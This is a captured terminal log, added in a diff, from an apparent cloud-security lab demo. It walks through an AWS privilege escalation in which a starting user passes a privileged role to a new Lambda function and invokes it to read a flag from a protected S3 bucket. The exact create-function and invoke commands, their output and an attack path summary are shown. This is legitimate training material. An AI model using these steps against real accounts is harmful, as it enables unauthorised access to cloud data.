@@ -1,0 +1,93 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + Lambda CreateFunction + InvokeFunction to S3 Bucket Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-lambda-001-to-bucket-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Target bucket: pl-prod-lambda-001-to-bucket-697683661464-66pzel
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33mStep 2: Configuring AWS CLI with starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-lambda-001-to-bucket-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have access to the target bucket yet[0m
+Attempting to list target bucket contents (should fail)...
+[2m[Attacker] $ aws s3 ls s3://pl-prod-lambda-001-to-bucket-697683661464-66pzel/[0m
+[0;32m✓ Confirmed: Cannot access bucket pl-prod-lambda-001-to-bucket-697683661464-66pzel (as expected)[0m
+
+[1;33mStep 5: Preparing Lambda function to read S3 bucket[0m
+Creating Python function that will read flag.txt from the target S3 bucket...
+[0;32m✓ Lambda function payload prepared[0m
+
+[1;33mStep 6: Creating Lambda function with target role (PassRole escalation)[0m
+This is the privilege escalation vector — passing the target role to Lambda...
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-lambda-001-to-bucket-target-role
+Target bucket passed as env var: pl-prod-lambda-001-to-bucket-697683661464-66pzel
+
+[0;36m[Attacker] $ aws lambda create-function --region us-east-1 --function-name pl-lambda-001-to-bucket-extractor --runtime python3.11 --role arn:aws:iam::123456789012:role/pl-prod-lambda-001-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --environment Variables={TARGET_BUCKET=pl-prod-lambda-001-to-bucket-697683661464-66pzel} --timeout 30 --output json[0m
+Function ARN: arn:aws:lambda:us-east-1:123456789012:function:pl-lambda-001-to-bucket-extractor
+[0;32m✓ Successfully created Lambda function with target role![0m
+
+[1;33mStep 7: Waiting for Lambda function to be ready[0m
+Allowing time for Lambda function initialization...
+[0;32m✓ Lambda function ready[0m
+
+[1;33mStep 8: Invoking Lambda function to read flag from target S3 bucket[0m
+Invoking function: pl-lambda-001-to-bucket-extractor
+
+[0;36m[Attacker] $ aws lambda invoke --region us-east-1 --function-name pl-lambda-001-to-bucket-extractor --payload '{}' /tmp/lambda-001-to-bucket-response.json --output json[0m
+[0;32m✓ Lambda function invoked successfully[0m
+
+Raw response from Lambda function:
+{
+  "statusCode": 200,
+  "body": "{\"flag\": \"flag{lambda_001_bucket_accessed}\"}"
+}
+
+[1;33mStep 9: Capturing CTF flag from Lambda response[0m
+
+[0;36m[Attacker (Lambda with target role)] $ # Lambda read s3://pl-prod-lambda-001-to-bucket-697683661464-66pzel/flag.txt and returned flag in response body[0m
+[0;32m✓ Flag captured: flag{lambda_001_bucket_accessed}[0m
+
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-lambda-001-to-bucket-starting-user (with iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction)
+2. Created Lambda function and passed pl-prod-lambda-001-to-bucket-target-role to it
+3. Lambda assumed the target role at invocation time, gaining s3:GetObject on the bucket
+4. Invoked Lambda to read flag.txt from pl-prod-lambda-001-to-bucket-697683661464-66pzel
+5. Extracted flag from Lambda response: flag{lambda_001_bucket_accessed}
+
+[1;33mAttack Path:[0m
+  pl-prod-lambda-001-to-bucket-starting-user → (iam:PassRole + lambda:CreateFunction) → Lambda with pl-prod-lambda-001-to-bucket-target-role
+  → (lambda:InvokeFunction) → s3:GetObject flag.txt → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws lambda create-function --region us-east-1 --function-name pl-lambda-001-to-bucket-extractor --runtime python3.11 --role arn:aws:iam::123456789012:role/pl-prod-lambda-001-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --environment Variables={TARGET_BUCKET=pl-prod-lambda-001-to-bucket-697683661464-66pzel} --timeout 30 --output json[0m
+  [0;36m$ aws lambda invoke --region us-east-1 --function-name pl-lambda-001-to-bucket-extractor --payload '{}' /tmp/lambda-001-to-bucket-response.json --output json[0m
+  [0;36m$ # Lambda read s3://pl-prod-lambda-001-to-bucket-697683661464-66pzel/flag.txt and returned flag in response body[0m
+
+[1;33mAttack Artifacts:[0m
+- Lambda Function: pl-lambda-001-to-bucket-extractor (still deployed — run cleanup_attack.sh)
+- Function Role: pl-prod-lambda-001-to-bucket-target-role
+
+[0;31mWarning: The Lambda function is still deployed[0m
+[0;31mLambda functions incur charges when invoked[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
